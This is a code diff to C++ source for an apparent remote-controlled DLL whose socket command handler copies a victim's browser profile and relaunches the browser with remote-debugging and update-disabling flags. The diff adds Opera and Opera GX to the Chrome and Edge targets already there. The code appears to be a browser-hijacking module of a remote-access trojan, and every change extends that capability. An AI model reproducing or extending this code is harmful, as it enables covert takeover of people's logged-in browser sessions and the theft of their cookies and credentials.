@@ -1316,6 +1316,14 @@ static wstring get_app_path(const wstring& appName) {
 
 static wstring get_browser_profile_path(const wstring& browserName) {
     wchar_t szPath[MAX_PATH];
+
+    if (browserName == L"Opera" || browserName == L"Opera GX") {
+        if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
+        wstring path = szPath;
+        path += L"\\Opera Software";
+        return path;
+    }
+
     if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
 
     wstring path = szPath;
@@ -1435,7 +1443,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             wstring wRequestedPath = utf8_to_wstring(requestedPath);
 
             bool isBrowser = (wRequestedPath == L"Google Chrome" ||
-                              wRequestedPath == L"Microsoft Edge");
+                              wRequestedPath == L"Microsoft Edge" ||
+                              wRequestedPath == L"Opera" ||
+                              wRequestedPath == L"Opera GX");
 
             if (isBrowser) {
                 thread([wRequestedPath]() {
@@ -1445,8 +1455,16 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     wstring exeName;
                     if (wRequestedPath == L"Google Chrome") exeName = L"chrome.exe";
                     else if (wRequestedPath == L"Microsoft Edge") exeName = L"msedge.exe";
+                    else if (wRequestedPath == L"Opera") exeName = L"opera.exe";
+                    else if (wRequestedPath == L"Opera GX") exeName = L"operagx.exe";
 
                     wstring exePath = get_app_path(exeName);
+                    if (exePath.empty()) {
+                        if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
+                            exePath = get_app_path(L"launcher.exe");
+                        }
+                    }
+
                     if (exePath.empty()) {
                         send_error("Browser executable not found.");
                         return;
@@ -1478,15 +1496,23 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
 
                     // İlk profili tespit et (Default veya Profile 1)
                     wstring profileDir = L"Default";
+                    if (wRequestedPath == L"Opera") profileDir = L"Opera Stable";
+                    else if (wRequestedPath == L"Opera GX") profileDir = L"Opera GX Stable";
+
                     WIN32_FIND_DATAW findData;
                     HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
                     if (hFind != INVALID_HANDLE_VALUE) {
                         do {
                             wstring name = findData.cFileName;
-                            if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
-                                (name == L"Default" || name.find(L"Profile ") == 0)) {
-                                profileDir = name;
-                                break;
+                            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                                if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
+                                    if (name == profileDir) break;
+                                } else {
+                                    if (name == L"Default" || name.find(L"Profile ") == 0) {
+                                        profileDir = name;
+                                        break;
+                                    }
+                                }
                             }
                         } while (FindNextFileW(hFind, &findData));
                         FindClose(hFind);
@@ -1526,6 +1552,13 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                    L" --disable-renderer-backgrounding"
                                    L" --remote-allow-origins=*"
                                    L" --lang=en-US";
+
+                    if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
+                        args += L" --disable-update --no-default-browser-check";
+                    }
+                    if (wRequestedPath == L"Opera GX") {
+                        args += L" --disable-features=GXC_Check_UI_Updates,GXC_Auto_Update --no-custom-menu";
+                    }
 
                     wstring fullCmd = L"\"" + exePath + L"\"" + args;
                     vector<wchar_t> cmdLine(fullCmd.begin(), fullCmd.end());
